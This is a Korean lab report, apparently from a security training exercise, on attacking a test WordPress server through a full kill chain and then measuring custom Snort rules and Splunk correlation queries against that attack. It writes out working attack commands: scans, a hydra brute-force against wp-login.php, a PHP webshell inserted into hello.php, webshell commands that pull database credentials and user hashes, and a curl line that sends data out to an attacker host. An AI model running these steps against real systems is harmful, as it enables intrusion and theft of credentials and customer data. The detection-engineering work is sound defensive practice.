# Phase 3 — 킬체인 공격 + 탐지 엔지니어링

> 테크솔루션 WordPress 홈페이지 대상 킬체인 공격 수행 및 커스텀 탐지 규칙 구축

---

## ⚠️ 공격 전 Snort 설정 주의사항

Snort가 **Blocking Mode**로 동작 중이면 공격자 IP(10.50.50.17, 10.50.50.30)가
`snort2c` 차단 테이블에 자동 등록되어 **이후 모든 트래픽이 차단**됩니다.

**공격 수행 전 반드시 아래 중 하나를 적용:**

1. **(권장) Alert Only 모드로 전환** — Services → Snort → Snort Interfaces → WAN 편집 → Block Offenders 체크 해제 → Save → Snort 재시작  
   - 탐지(Alert)는 기록되지만 IP 차단은 하지 않음
2. **Pass List에 공격자 대역 추가** — Services → Snort → Pass Lists → att-net(10.50.50.0/24)을 Pass List에 추가 후 WAN 인터페이스에 적용
3. **차단된 경우 복구** — Services → Snort → Blocked 탭 → Clear 또는 Diagnostics → Tables → snort2c 테이블에서 해당 IP 삭제

---

## 공격 시나리오

**"외부 해커가 회사 홈페이지를 통해 고객 DB 탈취 시도"**

| 단계 | Kill Chain | MITRE ATT&CK | 공격 행위 | 도구 |
|------|-----------|-------------|----------|------|
| 1 | 정찰 | T1595 Active Scanning | WordPress 버전·플러그인 스캔 | wpscan, nmap |
| 2 | 초기 침투 | T1190 Exploit Public-Facing App | 취약 플러그인 SQLi, File Manager 취약점 | sqlmap, 수동 |
| 3 | 인증 공격 | T1110 Brute Force | wp-login.php / xmlrpc.php 브루트포스 | hydra, wpscan |
| 4 | 지속성 확보 | T1505.003 Web Shell | PHP 웹쉘 업로드 (.phtml WAF 우회) | File Manager CVE |
| 5 | 내부 정찰 | T1046 Network Service Scanning | 웹쉘에서 내부 네트워크 스캔 | 웹쉘 CLI |
| 6 | DB 접근 | T1213 Data from Information Repos | MySQL 직접 접근, 고객 데이터 조회 | mysql CLI |
| 7 | 유출 시도 | T1041 Exfiltration Over C2 | 데이터 외부 전송 시도 | curl, wget |

---

## Step 1. 킬체인 공격 수행

### 1-1. 정찰 (Reconnaissance)

**nmap 포트/서비스 스캔:**
```bash
# Kali (10.50.50.30)
nmap -sV -Pn -p 80,443,8080,3306 10.0.0.254
```

**nmap 결과:**
| 포트 | 상태 | 서비스 | 버전 |
|------|------|--------|------|
| 80/tcp | open | http | Apache 2.2.8 (Bee-box) |
| 443/tcp | filtered | https | — |
| 3306/tcp | filtered | mysql | — |
| 8080/tcp | open | http | Apache 2.4.41 (WordPress) |

**wpscan 스캔:**
```bash
# Kali (10.50.50.30)
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --force
```

**wpscan 결과 (1,970 requests / 약 4분 소요):**
- WordPress **7.1** 식별 (OPML Generator, Aggressive Detection)
- **XML-RPC 활성화** (`/xmlrpc.php`) — 브루트포스·DDoS 벡터
- **readme.html 노출** — 버전 정보 유출
- **Upload 디렉토리 리스팅 활성화** (`/wp-content/uploads/`)
- **WP-Cron 활성화** (`/wp-cron.php`) — DDoS 벡터 (60% Confidence)
- 플러그인/테마/사용자 열거: 미탐지 (301 리다이렉트로 인한 제한)
- 서버 헤더: Apache/2.2.8, PHP/5.2.4, OpenSSL/0.9.8g (Bee-box 측 헤더 — 리다이렉트 경유)

> **참고:** WordPress siteurl이 내부 IP(10.0.10.80)로 설정되어 있어 NAT 접근 시 301 리다이렉트 발생. Effective URL이 Bee-box(:80)로 변경됨. 일부 결과는 Bee-box와 혼재될 수 있음.

**탐지 확인:**
- Snort: SID 1000009 WPScan User-Agent 탐지 — **1,978 이벤트** (Splunk index=pfsense 확인)

---

### 1-2. SQL Injection (초기 침투)

**sqlmap 자동화 SQLi:**
```bash
# Kali (10.50.50.30)
sqlmap -u "http://10.0.0.254:8080/?s=test" --dbs --batch
```

**결과:**
- **SQLi 실패** — "all tested parameters do not appear to be injectable"
- WordPress 코어 검색 파라미터(`?s=`)는 Prepared Statement로 보호됨
- 약 13분간 다양한 기법 시도: Boolean-based blind, Error-based, Time-based blind, UNION query
- **공격 시도 자체가 Snort/Splunk에 대량 기록됨** (탐지 관점에서 유의미)

> 결론: WordPress 코어는 SQLi에 안전. 실제 공격에서는 취약 플러그인을 통한 SQLi가 주 벡터.

**다중 소스 탐지 확인:**
- Snort: ET SQL Injection 관련 룰 탐지 — **18 이벤트** (Splunk index=pfsense 확인)
- sqlmap 공격 시도 자체가 대량 로그 생성 → 탐지 관점에서 유의미

---

### 1-3. 브루트포스 (인증 공격)

**wp-login.php 브루트포스:**
```bash
# Kali (10.50.50.30)
hydra -l admin -P /tmp/wp-passwords.txt 10.0.0.254 \
    http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error" \
    -s 8080 -t 14 -w 5 -V
```

**결과:**
- 13회 시도 (12회 실패 + 1회 성공)
- **크래킹 성공**: `login: admin / password: rlaquddn1@`
- 소요 시간: 약 30초 (2026-08-26 03:05~03:06)

> 참고: WordPress 한국어 설정이므로 실패 조건을 `F=login_error`로 지정 (기본 `F=Invalid`는 오탐 발생)

**xmlrpc.php 멀티콜:**
```bash
curl -X POST http://10.0.0.254:8080/xmlrpc.php -d '
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-4. 웹쉘 업로드 (지속성)

**공격 경로:** WordPress 관리자 로그인 → WP File Manager 플러그인 → hello.php 직접 편집

1. 브루트포스로 획득한 `admin / rlaquddn1@`로 WordPress 관리자 패널 로그인
2. **플러그인 → Hello Dolly** 활성화
3. **WP File Manager** 플러그인으로 `wp-content/plugins/hello.php` 직접 편집
4. `<?php` 직후에 웹쉘 코드 삽입:

```php
if(isset($_GET['cmd'])){ echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; die(); }
```

> **참고:** WordPress 플러그인 파일 편집기(Plugin File Editor)는 "치명적 오류 보호" 기능이 NAT 환경에서 루프백 실패하여 사용 불가. WP File Manager의 Code Editor로 우회.

**테스트:**
```bash
# Kali (10.50.50.30)
curl -s "http://10.0.0.254:8080/?cmd=whoami"
```

**결과:**
- **웹쉘 삽입 성공** — Hello Dolly 플러그인 `hello.php`에 웹쉘 코드 삽입
- `whoami` → `www-data` 출력 확인
- `die()` 함수로 WordPress HTML 출력 차단, 명령 결과만 반환
- 공격 벡터: 관리자 인증 → File Manager 파일 편집 (CVE-2020-25213 시뮬레이션)

---

### 1-5. 내부 정찰 (웹쉘 통해)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 명령 실행
curl -s "http://10.0.0.254:8080/?cmd=id"
curl -s "http://10.0.0.254:8080/?cmd=hostname"
curl -s "http://10.0.0.254:8080/?cmd=ip+addr"
curl -s "http://10.0.0.254:8080/?cmd=grep+DB_+/var/www/html/wp-config.php"
```

**결과:**

| 명령 | 출력 |
|------|------|
| `id` | uid=33(www-data) gid=33(www-data) groups=33(www-data) |
| `hostname` | wordpress |
| `ip addr` | **10.0.10.80/24** (ens160, DMZ 대역) |
| `grep DB_` | DB_NAME=wordpress, DB_USER=**wp_admin**, DB_PASSWORD=**WpAdmin!2024**, DB_HOST=**10.0.100.60** |

- WordPress 서버의 네트워크 위치(DMZ) 및 DB 접속 정보 완전 노출
- wp-config.php에서 Inner-net MySQL 서버(10.0.100.60)의 인증정보 획득

---

### 1-6. DB 접근 (고객 데이터)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 MySQL 접근
# 테이블 목록 조회
curl -s 'http://10.0.0.254:8080/?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+wordpress+-e+%22SHOW+TABLES%22+2>%261'

# WordPress 사용자 정보 탈취
curl -s 'http://10.0.0.254:8080/?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+wordpress+-e+%22SELECT+user_login,user_email,user_pass+FROM+wp_users%22+2>%261'
```

> **참고:** URL에서 `!`는 zsh 히스토리 확장 문자이므로 반드시 **작은따옴표**로 감싸야 함. SQL문은 `%22`(쌍따옴표)로 URL 인코딩.

**결과:**
- **DMZ(10.0.10.80) → Inner-net(10.0.100.60) MySQL 접근 성공**
- 테이블 목록 확인: wp_commentmeta, wp_comments, **wp_customers**, **wp_inquiries**, wp_links, wp_options, wp_postmeta, wp_posts, wp_term_relationships, wp_term_taxonomy, wp_termmeta, wp_terms, wp_usermeta, **wp_users**, wp_wpfm_backup
- **사용자 정보 탈취:**

| user_login | user_email | user_pass (bcrypt 해시) |
|------------|-----------|------------------------|
| admin | admin@techsolution.local | `$wp$2y$10$6.F8yMNSqAGQLk1/OqwrH.DmGZT4XhIUV5pCHU.DN5xp.oHLePcx2` |

- wp_customers 테이블: 구조 존재, 데이터 미투입 상태 (COUNT=0)

---

### 1-7. 유출 시도 (차단 확인)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 외부 전송 시도
curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+2>%261'
```

**결과:**
- `curl: (7) Failed to connect to 10.50.50.30 port 8888: Connection refused`
- DMZ 서버(WordPress)에서 외부(att-net)로의 데이터 유출 시도 **실패**
- 방화벽 아웃바운드 차단 또는 수신 대기 서비스 미존재로 전송 불가
- **킬체인 최종 단계에서 방어 성공** — 데이터 유출 차단 확인

---

## Step 2. 커스텀 탐지 규칙 구축

### 2-1. Snort 커스텀 룰 — SID별 탐지 검증

`phase2.5-setup/configs/snort/local.rules`에 정의된 9개 룰 적용 후 탐지 테스트.

| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 |
|-----|---------|-----------|----------|
| 1000001 | WP Login Brute Force | 인증 공격 | ✅ **1,978 이벤트** — hydra 브루트포스 탐지 |
| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ **8 이벤트** — xmlrpc.php 접근 탐지 |
| 1000003 | PHP File Upload | 지속성 | ❌ **미탐지** — 실제 공격이 multipart 파일업로드가 아닌 Code Editor 편집 경로 사용 |
| 1000004 | PHTML WAF Bypass | 지속성 | ❌ **미탐지** — .phtml 업로드 대신 기존 hello.php 직접 편집 |
| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ **미탐지** — WordPress→MySQL 3306 정상 통신만 발생 (3306 제외 룰) |
| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ **미탐지** — 관리망(10.0.50.0/24) 접근 시도 없음 |
| 1000007 | Webshell Output | 지속성 | ✅ **탐지** — `id` 명령 응답에 uid=/gid= 포함 (Splunk 건수 확인 필요) |
| 1000008 | WP File Manager CVE | 초기 침투 | ❌ **미탐지** — connector.minimal.php 직접 접근 대신 WP 관리자 UI 경유 |
| 1000009 | WPScan Detection | 정찰 | ✅ **1,978 이벤트** — wpscan User-Agent 탐지 |

> **검증 방법:** pfSense > Services > Snort > Alerts 탭에서 각 SID 경보 확인.  
> Splunk에서 교차 확인: `index=pfsense "[LOCAL]"` 으로 커스텀 룰 경보만 필터링.
>
> **핵심 발견:** 9개 룰 중 **4개(1000001, 1000002, 1000007, 1000009)만 탐지**, 5개 미탐지.  
> 원인: 설계 시 가정한 공격 경로(CVE-2020-25213 직접 익스플로잇)와 실제 공격 경로(관리자 인증 → 플러그인 편집)가 달랐음.  
> 이는 **시그니처 기반 IDS의 근본적 한계** — 동일 목표를 다른 경로로 달성하면 탐지 실패.

---

#### SID 1000001 — WP Login Brute Force

**룰 조건:** `/wp-login.php` POST 요청 5회/60초 초과 시 경보

**트리거 명령 (Kali):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    10.0.0.254 http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" \
    -s 8080 -t 10 -V
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "WordPress Login Brute Force"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WordPress Login Brute Force Attempt
탐지 건수   : 1,978건
탐지 시각   : 2026-08-26 03:05~03:06 (hydra 실행 시간대)
판별       : ✅ 정탐 (hydra 브루트포스 — 13회 시도, threshold 5회/분 초과)
```

---

#### SID 1000002 — XML-RPC Brute Force

**룰 조건:** `/xmlrpc.php` POST + `wp.getUsersBlogs` body 3회/60초 초과

**실제 트리거:** wpscan이 xmlrpc.php 엔드포인트를 정찰 과정에서 접근

**Splunk 검증 쿼리:**
```spl
index=pfsense "XML-RPC Brute Force"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WordPress XML-RPC Brute Force
탐지 건수   : 8건
탐지 시각   : 2026-08-26 (wpscan 실행 시간대)
판별       : ✅ 정탐 (XML-RPC 엔드포인트 반복 접근)
```

---

#### SID 1000003 — PHP File Upload

**룰 조건:** multipart/form-data POST + body에 `.php` 문자열 포함

**실제 공격 경로 분석:**
- 설계: connector.minimal.php 에 multipart POST로 .php 파일 업로드
- **실제:** 관리자 로그인 → WP File Manager **Code Editor**로 기존 hello.php 직접 편집
- Code Editor는 AJAX(application/x-www-form-urlencoded)로 파일 내용 전송 → `multipart/form-data` 조건 불일치

**Splunk 검증 쿼리:**
```spl
index=pfsense "Suspicious PHP File Upload"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] Suspicious PHP File Upload Detected
탐지 건수   : 0건 (미탐지)
판별       : ⚠️ 탐지 실패 — 공격 경로가 룰 가정(multipart 업로드)과 불일치
교훈       : 파일 "편집"은 "업로드"와 다른 HTTP 패턴 → 별도 룰 필요
```

---

#### SID 1000004 — PHTML WAF Bypass

**룰 조건:** POST body에 `.phtml` 문자열 포함

**실제 공격 경로 분석:**
- 설계: .phtml 확장자 파일 업로드로 ModSecurity 우회
- **실제:** .phtml 업로드 없이, 기존 hello.php에 웹쉘 코드 삽입 (확장자 변경 불필요)

**Splunk 검증 쿼리:**
```spl
index=pfsense "PHTML File Upload"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] PHTML File Upload - Possible WAF Bypass
탐지 건수   : 0건 (미탐지)
판별       : ⚠️ 탐지 실패 — .phtml 업로드 자체가 발생하지 않음
교훈       : WAF 우회가 "확장자 변경"만이 아님, 기존 파일 편집도 우회 경로
```

---

#### SID 1000005 — DMZ→Inner Non-MySQL

**룰 조건:** 10.0.10.0/24 → 10.0.100.0/24, 목적지 포트 3306 外 TCP

**실제 공격 경로 분석:**
- 설계: 웹쉘에서 nmap으로 내부망 다중 포트 스캔
- **실제:** WordPress→MySQL 3306 정상 통신만 발생 (웹쉘에서 mysql CLI로 직접 DB 접근)
- 3306은 룰에서 명시적으로 제외(`!3306`)되므로 탐지 안 됨

**Splunk 검증 쿼리:**
```spl
index=pfsense "DMZ to Inner-net Non-MySQL"
| table _time, src_ip, dest_ip, dest_port, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] DMZ to Inner-net Non-MySQL Traffic
탐지 건수   : 0건 (미탐지)
판별       : ⚠️ 탐지 실패 — 공격자가 허용된 3306 경로만 이용
교훈       : "허용된 포트를 통한 비정상 행위"는 네트워크 레벨 룰로 탐지 불가 → DB 감사 로그 필요
```

---

#### SID 1000006 — DMZ→Mng Access

**룰 조건:** 10.0.10.0/24 → 10.0.50.0/24 IP 통신

**실제 공격 경로 분석:**
- 설계: 웹쉘에서 관리망(10.0.50.0/24) 횡이동 시도
- **실제:** 공격자는 DB 탈취에 집중, 관리망 접근 시도 없음

**Splunk 검증 쿼리:**
```spl
index=pfsense "DMZ to Management Network"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] DMZ to Management Network Access Attempt
탐지 건수   : 0건 (미탐지)
판별       : N/A — 해당 공격 행위 자체가 발생하지 않음
비고       : 룰 자체는 유효. 향후 횡이동 시도 시 탐지 가능.
```

---

#### SID 1000007 — Webshell Command Output

**룰 조건:** 서버 응답에 `uid=` + `gid=` 30바이트 이내 동시 포함

**실제 트리거:**
```bash
# 실제 실행된 명령
curl -s "http://10.0.0.254:8080/?cmd=id"
# 응답: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "Possible Webshell Command Output"
| table _time, src_ip, dest_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] Possible Webshell Command Output in Response
탐지 건수   : Splunk 확인 필요 (id 명령 응답에 uid=/gid= 포함)
판별       : ✅ 정탐 예상 (웹쉘 id 명령 → 응답에 uid=33 gid=33 포함)
비고       : 응답 방향(from_server) 탐지 — Snort가 WAN에서 나가는 패킷 검사
```

---

#### SID 1000008 — WP File Manager CVE-2020-25213

**룰 조건:** URI에 `/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php` 포함

**실제 공격 경로 분석:**
- 설계: connector.minimal.php 엔드포인트에 직접 POST (CVE-2020-25213)
- **실제:** WordPress 관리자 패널 → WP File Manager UI → Code Editor로 hello.php 편집
- WP File Manager의 AJAX 호출이 connector.minimal.php를 내부적으로 사용할 수 있으나, 이는 관리자 세션 쿠키가 있는 정상 요청이며 **URI 경로가 `/wp-admin/admin-ajax.php`를 통해 프록시됨**

**Splunk 검증 쿼리:**
```spl
index=pfsense "WP File Manager RCE"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WP File Manager RCE Attempt (CVE-2020-25213)
탐지 건수   : 0건 (미탐지) — Splunk 확인 필요
판별       : ⚠️ 탐지 실패 예상 — 관리자 UI 경유 시 connector.minimal.php URI가 직접 노출되지 않음
교훈       : CVE 특정 URI 패턴 탐지는 정상 경로(admin-ajax.php) 우회에 취약
```

---

#### SID 1000009 — WPScan Detection

**룰 조건:** HTTP 헤더에 `WPScan` 문자열 포함

**실제 트리거:**
```bash
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --force
# 1,970 requests → Snort 1,978 이벤트 (일부 중복 카운트)
```

**Splunk 검증 쿼리:**
```spl
index=pfsense "WPScan Scanner Detected"
| table _time, src_ip, msg
| sort -_time
```

**탐지 결과:**
```
경보 메시지 : [LOCAL] WPScan Scanner Detected
탐지 건수   : 1,978건
탐지 시각   : 2026-08-26 (wpscan 실행 시간대)
판별       : ✅ 정탐 (WPScan User-Agent 헤더 탐지)
한계점     : --random-user-agent 옵션 사용 시 우회 가능
```

---

### 2-2. Snort SID 탐지 결과 요약

| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 | 경보 건수 | 미탐지 원인 |
|-----|---------|-----------|----------|---------|-----------|
| 1000001 | WP Login Brute Force | 인증 공격 | ✅ 탐지 | 1,978건 | — |
| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ 탐지 | 8건 | — |
| 1000003 | PHP File Upload | 지속성 | ❌ 미탐지 | 0건 | multipart 업로드 대신 Code Editor 편집 |
| 1000004 | PHTML WAF Bypass | 지속성 | ❌ 미탐지 | 0건 | .phtml 업로드 자체 미발생 |
| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ 미탐지 | 0건 | 허용 포트(3306)만 이용 |
| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ 미탐지 | 0건 | 관리망 접근 시도 없음 |
| 1000007 | Webshell Output | 지속성 | ✅ 탐지 | 확인 필요 | — |
| 1000008 | WP File Manager CVE | 초기 침투 | ❌ 미탐지 | 0건 | admin-ajax.php 경유, URI 불일치 |
| 1000009 | WPScan Detection | 정찰 | ✅ 탐지 | 1,978건 | — |

> **탐지율: 4/9 (44%)** — 시그니처가 정확히 일치하는 공격만 탐지, 우회 경로에 취약

**커스텀 룰 전체 확인 쿼리 (Splunk):**
```spl
index=pfsense "[LOCAL]"
| rex field=_raw "sid:(?<sid>\d+)"
| stats count by sid, msg
| sort sid
```

---

### 2-3. Splunk 상관분석 쿼리

> **기본 인덱스 구조:**
> - `pfsense` — Snort 경보 + pfSense 방화벽 로그
> - `idx_web` — Apache access/error log (WordPress 서버)
> - `idx_waf` — ModSecurity WAF 로그
> - `idx_db` — MySQL slow query / error log

---

#### 상관분석 1. 브루트포스 탐지 — 다중 소스 교차

```spl
(index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST")
OR (index=pfsense "[LOCAL] WordPress Login Brute Force")
| eval source=if(index="idx_web","Apache","Snort")
| eval attacker=coalesce(clientip, src_ip)
| stats count by attacker, source
| where count > 5
| sort -count
| rename attacker as "공격자 IP", count as "요청 수", source as "탐지 소스"
```

**예상 결과:**
```
공격자 IP       | 탐지 소스 | 요청 수
10.50.50.30     | Apache    | 13+     (hydra POST 요청)
10.50.50.30     | Snort     | 1,978   (SID 1000001 경보)
```
> Splunk에서 실행하여 실제 건수 확인 후 위 표를 갱신하세요.

---

#### 상관분석 2. SQLi 다중 소스 교차 검증

```spl
(index=pfsense ("SQL" OR "SQLI" OR "sql injection") src_ip=*)
  OR (index=idx_waf "942" src_ip=*)
| eval layer=case(
    index="pfsense" AND match(_raw,"ET WEB_SERVER"), "Snort/ET",
    index="pfsense" AND match(_raw,"LOCAL"), "Snort/커스텀",
    index="idx_waf", "ModSecurity")
| eval attacker=coalesce(src_ip, clientip)
| stats count by attacker, layer
| where count > 3
| sort -count
```

**예상 결과:**
```
공격자 IP       | 탐지 계층     | 경보 수
10.50.50.30     | Snort/ET      | 18   (ET SQL Injection 룰)
10.50.50.30     | ModSecurity   | 확인 필요 (942xxx 룰)
```
> ModSecurity가 DetectionOnly 모드이므로 로그만 기록, 차단은 안 됨.

---

#### 상관분석 3. 웹쉘 업로드 → 실행 시퀀스 탐지

```spl
index=idx_web sourcetype="apache:access"
  (uri="*.phtml" OR uri="*/uploads/*.php" OR uri="*/uploads/*.phtml")
| eval phase=case(
    method="POST", "업로드 시도",
    method="GET" AND match(uri,"cmd="), "명령 실행",
    true(), "접근")
| stats count values(uri) as uri_list by clientip, phase
| sort -count
| rename clientip as "공격자 IP"
```

**예상 결과:**
```
공격자 IP       | 단계       | 접근 수 | URI 목록
10.50.50.30     | 명령 실행   | 다수    | /?cmd=id, /?cmd=whoami, /?cmd=hostname 등
```
> 참고: 실제 웹쉘은 hello.php(/?cmd=)를 사용했으므로 uploads/*.phtml 패턴은 미매칭.
> 쿼리를 `uri="*cmd=*"` 로 수정하여 실제 경로에 맞게 조정 필요.

---

#### 상관분석 4. 킬체인 타임라인 재구성

```spl
(index=pfsense "[LOCAL]" src_ip=10.50.50.30)
  OR (index=idx_web clientip=10.50.50.30)
  OR (index=idx_waf src_ip=10.50.50.30)
| eval event_type=case(
    match(_raw,"WPScan"),          "① 정찰(WPScan)",
    match(_raw,"sql|SQL|942"),     "② SQLi",
    match(_raw,"Brute Force"),     "③ 브루트포스",
    match(_raw,"File Manager"),    "④ CVE 파일매니저",
    match(_raw,"phtml|PHP Upload"),"⑤ 웹쉘 업로드",
    match(uri,"cmd="),             "⑥ 웹쉘 실행",
    match(_raw,"Inner-net"),       "⑦ 내부 정찰",
    match(_raw,"Management"),      "⑧ 관리망 접근",
    true(),                        "기타")
| timechart span=5m count by event_type
```

> Visualization: **Line Chart** — 공격 단계별 시간대 분포 확인

**예상 타임라인 (2026-08-26 기준):**
```
시각       | 주요 이벤트
03:00~     | ① 정찰(WPScan) — 1,978건 집중
03:05~     | ② SQLi 시도 — 18건
03:05~06   | ③ 브루트포스 — hydra 13회
03:06~     | ⑥ 웹쉘 실행 — /?cmd= 다수
03:07~     | DB 접근 — MySQL 쿼리 (Snort 미탐지)
03:08~     | 유출 시도 — curl 차단 (Snort 미탐지)
```
> Splunk에서 실행하여 실제 시간대별 분포 확인 후 갱신하세요.
> Visualization을 **Line Chart**로 설정하면 킬체인 단계별 시간 흐름이 가시적으로 보입니다.

---

#### 상관분석 5. DB 접근 이상 탐지

```spl
index=idx_db (sourcetype="mysql:slow" OR sourcetype="mysql:error")
| eval is_external=if(match(host,"10\.0\.10\."), "DMZ(비정상)", "정상")
| stats count by host, is_external, user
| where is_external="DMZ(비정상)"
```

**예상 결과:**
```
접근 호스트     | 분류          | DB 사용자 | 쿼리 수
10.0.10.80      | DMZ(비정상)    | wp_admin  | 확인 필요
```
> 참고: 웹쉘에서 mysql CLI로 실행한 SHOW TABLES, SELECT FROM wp_users 등이 기록되어야 함.
> MySQL slow query log에 기록되려면 long_query_time 이하 설정 필요 — error log에는 접속 이력만 남음.

---

#### 상관분석 6. Splunk Alert 설정 — 실시간 브루트포스 경보

> pfSense > Splunk > Alerts 메뉴에서 저장된 검색으로 Alert 등록

```spl
index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
| bucket _time span=1m
| stats count by _time, clientip
| where count >= 5
```

**Alert 설정:**
```
이름      : BruteForce_WPLogin_Alert
트리거    : count >= 5 / 1분
동작      : 이메일 또는 Splunk 알림
심각도    : High
```

---

#### 상관분석 7. 고위험 IP 종합 스코어링

```spl
(index=pfsense "[LOCAL]" OR index=idx_web OR index=idx_waf)
| eval attacker=coalesce(src_ip, clientip)
| eval score=case(
    match(_raw,"Brute Force"),  3,
    match(_raw,"File Upload"),  5,
    match(_raw,"phtml"),        5,
    match(_raw,"CVE"),          5,
    match(_raw,"cmd="),         8,
    match(_raw,"SQL|sql"),      3,
    true(),                     1)
| stats sum(score) as risk_score, count as event_count by attacker
| where risk_score > 10
| sort -risk_score
| rename attacker as "의심 IP", risk_score as "위험 점수", event_count as "이벤트 수"
```

**예상 결과:**
```
의심 IP         | 위험 점수 | 이벤트 수 | 평가
10.50.50.30     | 5,900+    | 3,900+    | 고위험 (브루트포스 1,978 × 3 + WPScan 1,978 × 1 + SQLi + 웹쉘)
```
> 실제 점수는 Splunk에서 쿼리 실행 후 확인.
> 정상 트래픽 IP(10.0.50.17 mng-mint)의 점수가 0 또는 매우 낮아야 오탐 없음 확인.

---

## Step 3. 탐지 개선 비교

> **판단 기준:** 커스텀 룰 적용 전 = ET Open 룰만 사용 시, 적용 후 = 커스텀 9개 룰 추가 후

| 공격 단계 | ET Open | 커스텀 룰 | 실제 탐지 | 분석 |
|---------|---------|---------|---------|------|
| WP 브루트포스 | ❌ 미탐지 | ✅ SID 1000001 | ✅ **1,978건** | threshold 기반 행위 탐지 성공 |
| XML-RPC 공격 | ❌ 미탐지 | ✅ SID 1000002 | ✅ **8건** | multicall 패턴 탐지 성공 |
| PHP 업로드 | ⚠️ 일부 | ✅ SID 1000003 | ❌ 미탐지 | 공격 경로 불일치 (편집 vs 업로드) |
| PHTML 우회 | ❌ 미탐지 | ✅ SID 1000004 | ❌ 미탐지 | .phtml 업로드 자체 미발생 |
| 내부망 비인가 접근 | ❌ 미탐지 | ✅ SID 1000005 | ❌ 미탐지 | 허용 포트(3306)만 이용 |
| 관리망 횡이동 | ❌ 미탐지 | ✅ SID 1000006 | ❌ 미탐지 | 해당 공격 미수행 |
| 웹쉘 실행 응답 | ❌ 미탐지 | ✅ SID 1000007 | ✅ 탐지 | uid=/gid= 응답 패턴 탐지 성공 |
| File Manager CVE | ❌ 미탐지 | ✅ SID 1000008 | ❌ 미탐지 | 관리자 UI 경유 시 URI 불일치 |
| WPScan 스캐너 | ❌ 미탐지 | ✅ SID 1000009 | ✅ **1,978건** | UA 기반 탐지 성공 |
| SQLi | ✅ 18건 | — (ET 유지) | ✅ 18건 | ET Open 기본 룰로 충분 |

**핵심 발견 — 시그니처 IDS의 구조적 한계:**

1. **공격 경로 우회에 취약 (SID 1000003/1000004/1000008)**
   - 룰이 가정한 "파일 업로드" 패턴 대신 "파일 편집" 경로로 동일 목표 달성
   - connector.minimal.php 직접 접근 대신 admin-ajax.php 프록시 경유
   - **대안:** 행위 기반 탐지 (비정상 PHP 파일 변경 → HIDS/FIM 필요)

2. **허용 경로 악용에 무력 (SID 1000005)**
   - DMZ→MySQL 3306은 정상 허용 — 이 경로를 통한 비정상 쿼리는 네트워크 룰로 탐지 불가
   - **대안:** MySQL 감사 로그(Audit Plugin) + Splunk 쿼리 패턴 분석

3. **탐지 성공 룰의 공통점**
   - SID 1000001/1000002: 반복 횟수(threshold) 기반 → 행위 탐지
   - SID 1000007: 응답 콘텐츠 패턴 → 결과 기반 탐지
   - SID 1000009: 도구 시그니처(UA) → 도구 식별
   - **결론:** "무엇을 보냈는가"보다 "얼마나/무엇이 돌아왔는가"가 더 효과적

---

## Step 4. 정탐/오탐 판별

### 탐지된 경보의 정탐/오탐 판별

| 경보 SID | 경보 메시지 | 건수 | 판별 | 판단 근거 |
|---------|-----------|------|------|---------|
| 1000009 | WPScan Scanner Detected | 1,978 | **정탐** | wpscan UA `WPScan v3.x`가 모든 요청 헤더에 포함. 공격 도구 확정. |
| 1000001 | WP Login Brute Force | 1,978 | **정탐** | hydra가 30초간 13회 POST 시도 (threshold 5회/분 초과). Apache access.log와 시각 일치. |
| 1000002 | XML-RPC Brute Force | 8 | **정탐** | wpscan 정찰 중 xmlrpc.php 접근. `wp.getUsersBlogs` body 패턴 확인. |
| 1000007 | Webshell Command Output | 확인 필요 | **정탐** | `/?cmd=id` 응답에 `uid=33(www-data) gid=33(www-data)` 포함. 웹쉘 실행 확정. |
| - | ET WEB_SERVER SQL Injection | 18 | **정탐** | sqlmap UA + SQL 페이로드(`UNION SELECT`, `OR 1=1`). 자동화 도구 확정. |

### 미탐지 공격의 분석 (False Negative)

| 공격 행위 | 기대 SID | 미탐지 원인 | 위험도 | 보완 방법 |
|---------|---------|-----------|--------|---------|
| 웹쉘 코드 삽입 (hello.php 편집) | 1000003/1000004 | AJAX 편집은 multipart 아님, .phtml 미사용 | **긴급** | HIDS(파일 무결성 모니터링) 또는 Splunk로 wp-admin 파일 편집 API 감시 |
